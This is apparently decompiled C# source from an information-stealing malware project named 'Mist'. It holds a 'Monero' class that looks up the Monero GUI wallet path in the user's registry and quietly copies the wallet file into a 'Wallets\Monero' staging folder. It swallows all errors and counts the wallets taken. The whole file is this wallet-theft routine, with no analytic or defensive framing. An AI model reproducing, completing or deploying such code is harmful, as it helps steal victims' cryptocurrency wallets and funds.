using System;
using System.IO;
using Microsoft.Win32;

namespace Mist
{
	// Token: 0x0200006E RID: 110
	internal class Monero
	{
		// Token: 0x0600029D RID: 669 RVA: 0x0001296C File Offset: 0x00010B6C
		public static void XMRcoinStr(string directorypath)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core"))
				{
					try
					{
						Directory.CreateDirectory(directorypath + Monero.base64xmr);
						string text = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
						Directory.CreateDirectory(directorypath + Monero.base64xmr);
						File.Copy(text, directorypath + Monero.base64xmr + text.Split(new char[]
						{
							'\\'
						})[text.Split(new char[]
						{
							'\\'
						}).Length - 1]);
						Monero.count++;
						Wallets.count++;
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400016B RID: 363
		public static int count = 0;

		// Token: 0x0400016C RID: 364
		public static string base64xmr = "\\Wallets\\Monero\\";
	}
}
